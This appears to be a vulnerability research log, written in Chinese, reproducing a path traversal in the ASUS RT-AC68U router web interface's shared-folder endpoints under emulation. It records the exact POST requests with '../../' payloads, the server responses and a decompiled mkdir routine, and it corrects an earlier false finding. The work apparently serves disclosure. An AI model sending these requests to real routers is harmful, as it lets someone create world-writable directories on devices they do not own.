@@ -1,0 +1,108 @@
+# A-5 共享文件夹接口路径穿越 —— 动态复现（ASUS RT-AC68U 384.81049）
+日期: 2026-11-03T18:50:18+08:00
+固件: FW_RT_AC68U_300438481049.zip sha256=68a8cf0c223e18d4a1bc91ed4cb6d382ac1f5f8b2c1a0c8d027135c07dec227b
+httpd sha256: 34f18fd6abc66ecd7589177d029e81dc9df7e0c6d5de47c7cacc3710aa1f71ce
+运行方式: 固件自带 /usr/sbin/httpd，qemu-arm-static + chroot，cwd=/www；libnvram 用桩
+关键环境: /proc/mounts 需含一行 device 里带 pool 名的挂载项，read_mount_data 会把该行
+          挂载点取出来当共享目录：  /dev/test /tmp/mnt/test ufsd rw 0 0
+
+## 0) 登录拿 token
+    asus_token=<redacted>
+
+## 1) 对照：共享目录内正常改名（pool=test folder=benign_src new_folder=benign_dst）
+    --- 请求 ---
+    POST /aidisk/modify_sharedfolder.asp  pool=test&folder=benign_src&new_folder=benign_dst
+    --- 响应（尾 6 行）---
+    modify_sharedfolder_success();
+    </script>
+    
+    </body>
+    </html>
+    
+    --- 共享目录 ---
+    benign_dst
+    renamed_dir
+    victim.txt
+
+## 2) 穿越：new_folder=../../ESCAPED_DIR
+    --- 穿越前 ---
+    共享目录: benign_dst renamed_dir trav_src victim.txt 
+    /tmp/ESCAPED_DIR: 不存在
+    --- 请求 ---
+    POST /aidisk/modify_sharedfolder.asp  pool=test&folder=trav_src&new_folder=../../ESCAPED_DIR
+    --- 响应（尾 6 行）---
+    modify_sharedfolder_success();
+    </script>
+    
+    </body>
+    </html>
+    
+    --- 穿越后 ---
+    共享目录: benign_dst renamed_dir victim.txt 
+    /tmp/ESCAPED_DIR: drwxr-xr-x 2 root root 4096 Nov  3 18:50 /tmp/ESCAPED_DIR
+
+## 3) 结论
+    同一接口、同一 token、只改 new_folder：目录内改名成功；带 ../../ 时目录被搬到共享目录之外，
+    证明 new_folder 未做路径校验（CWE-22）。
+
+## 4) 同族 create_sharedfolder：照样能穿出去建目录
+    POST /aidisk/create_sharedfolder.asp  account=&pool=test&folder=../../NEW_OUTSIDE_DIR
+    -> create_sharedfolder_success()
+    /tmp/NEW_OUTSIDE_DIR: drwxrwxrwx root:root   （共享目录 /tmp/mnt/test 之外）
+
+## 5) 同族 delete_sharedfolder：本轮未复现
+    POST /aidisk/delete_sharedfolder.asp  pool=test&folder=../../OUTSIDE_DELDIR
+    -> delete_sharedfolder_error(alert_msg.Action6)
+    目标 /tmp/OUTSIDE_DELDIR 仍在。原因：该 handler 先拿 .__folder_list.txt 做白名单，
+    不在列表里的名字直接拒。代码同族但"穿越删除"未证实，报送时只能写"同族可疑"。
+
+## 6) 复现脚本与截图
+    一键脚本: evidence/replay-sharedfolder-traversal.sh
+    逐字输出: evidence/A5b-traversal-replay-transcript.txt
+    截图    : publish/screenshots/asus-share-traversal.png
+
+## 7) 2026-11-03 更正：换成**真实挂载的 ext4 文件系统**后，结论变了（重要）
+把假 /proc/mounts 换成真挂载（device 名里带 pool 名，绕开 read_mount_data 的 strstr）：
+
+    #: mknod /dev/test b 7 0   (loop0 上是一个真 ext4 镜像)
+    /proc/mounts(客户机视角): /dev/test /tmp/mnt/test ext4 rw,relatime 0 0
+
+结果：
+
+| 用例 | 请求 | 结果 |
+|---|---|---|
+| A 对照（同 fs 内改名） | folder=benign_src&new_folder=benign_dst | `modify_sharedfolder_success()`，目录内改名成功 |
+| B 跨 fs 改名 | folder=trav_src&new_folder=../../ESCAPED_DIR | **`modify_sharedfolder_error(alert_msg.Action7)`**，`/tmp/ESCAPED_DIR` 未出现 |
+| C 跨 fs 建目录 | folder=../../NEW_OUTSIDE_DIR | `create_sharedfolder_success()`，`/tmp/NEW_OUTSIDE_DIR` 出现 |
+
+原因：`libdisk.so::mod_folder()` 调的是 **rename(2)**（Ghidra CALLEES 里可见 `rename @ 0x127d7`），
+真机上共享目录是独立 USB 文件系统，`..` 落到 /tmp（rootfs/tmpfs）时 rename 返回 **EXDEV**，被拒。
+早先"跨目录改名成功"是因为假 /proc/mounts 让 /tmp/mnt/test 与 /tmp 属于同一个 superblock —— 那是环境假象。
+
+**修正后的结论**：
+- `modify_sharedfolder`：未做 `..` 过滤，但 rename 被文件系统边界挡住 —— 只能在同一块盘内改名，
+  穿不出共享目录所在的文件系统。**不作为对外漏洞**（最多算"同盘内可移动目录"）。
+- `create_sharedfolder`：`mkdir` 不受 superblock 限制，`../../NEW_OUTSIDE_DIR` 能在共享目录之外
+  建出 0777 目录 —— **这条成立**，是本次要报的点。
+
+## 8) create_sharedfolder：静态依据 + 更硬的落点（回应审查）
+libdisk.so::add_folder() 反编译（0x21fa8）：
+
+    iVar1 = test_if_exist_share(param_2, param_3);
+    sVar2 = strlen(param_2); sVar3 = strlen(param_3);
+    snprintf(path, size, "%s/%s", param_2 /* mount */, param_3 /* folder */);
+    umask(0);
+    mkdir(path, 0x1ff);            /* 0777，且先 umask(0) */
+    add_folder_at_var_file(...);
+
+没有任何 ".."、"/"、前缀校验；`mkdir` 不受挂载点限制。
+
+动态落点（同一 token、只改 folder）：
+
+| folder 参数 | 结果 | 落点 |
+|---|---|---|
+| ../../NEW_OUTSIDE_DIR | create_sharedfolder_success() | /tmp/NEW_OUTSIDE_DIR（drwxrwxrwx） |
+| ../../etc/CNVD_ETC_DIR | create_sharedfolder_success() | /etc/CNVD_ETC_DIR（drwxrwxrwx） |
+| ../../jffs/CNVD_JFFS_DIR | create_sharedfolder_error(Action5) | 未创建（该路径在仿真里不可用） |
+
+`/etc`（root 755）也能建出来，说明不是"只能落在 1777 的 /tmp"，而是 httpd 进程（root）能写的地方都能建。
